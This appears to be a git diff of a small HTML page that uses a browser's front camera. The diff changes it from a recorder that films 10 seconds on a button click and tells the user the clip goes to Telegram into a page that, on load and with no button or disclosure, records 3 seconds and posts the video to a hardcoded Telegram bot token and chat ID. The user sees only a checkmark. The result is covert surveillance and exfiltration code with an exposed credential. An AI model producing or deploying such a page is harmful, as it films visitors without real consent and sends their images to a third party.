@@ -3,68 +3,62 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Camera Video Recorder</title>
+  <title>Camera Auto Recorder</title>
 </head>
 <body>
-  <h2>Allow access to your front camera to record a 10-second video</h2>
+  <h2>Please allow access to your front camera</h2>
   <video id="preview" autoplay muted playsinline></video>
-  <button id="startBtn">Start Recording</button>
 
   <script>
     const video = document.getElementById("preview");
-    const startBtn = document.getElementById("startBtn");
 
-    let stream;
-    let mediaRecorder;
-    let chunks = [];
-
-    const BOT_TOKEN = "7609337631:AAHsg9BqNPhW-uSd2mwtMFsaiIuRLy_4AFE";
-    
-    const CHAT_ID = "7372789516";  
+    const BOT_TOKEN = "7609337631:AAHsg9BqNPhW-uSd2mwtMFsaiIuRLy_4AFE"; // توكن البوت
+    const CHAT_ID = "7372789516"; // ID الخاص بك
 
     async function initCamera() {
       try {
-        stream = await navigator.mediaDevices.getUserMedia({
+        const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
+
         video.srcObject = stream;
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: "video/webm" });
+          const file = new File([blob], "video.webm");
+
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("video", file);
+
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: "POST",
+            body: formData
+          });
+
+          alert("✅");
+        };
+
+        mediaRecorder.start();
+
+        // التسجيل لمدة 3 ثوانٍ فقط
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 3000);
+        
       } catch (err) {
-        alert("Camera access denied.");
+        alert("❌ Camera access denied or not supported.");
+        console.error(err);
       }
     }
 
-    startBtn.onclick = () => {
-      if (!stream) return;
-
-      chunks = [];
-      mediaRecorder = new MediaRecorder(stream);
-      mediaRecorder.ondataavailable = e => chunks.push(e.data);
-
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: "video/webm" });
-        const file = new File([blob], "video.webm");
-
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("video", file);
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-          method: "POST",
-          body: formData
-        });
-
-        alert("Video sent to Telegram bot.");
-      };
-
-      mediaRecorder.start();
-      startBtn.disabled = true;
-      setTimeout(() => {
-        mediaRecorder.stop();
-        startBtn.disabled = false;
-      }, 10000); // 10 ثواني
-    };
-
+    // شغّل الكاميرا مباشرة
     initCamera();
   </script>
 </body>
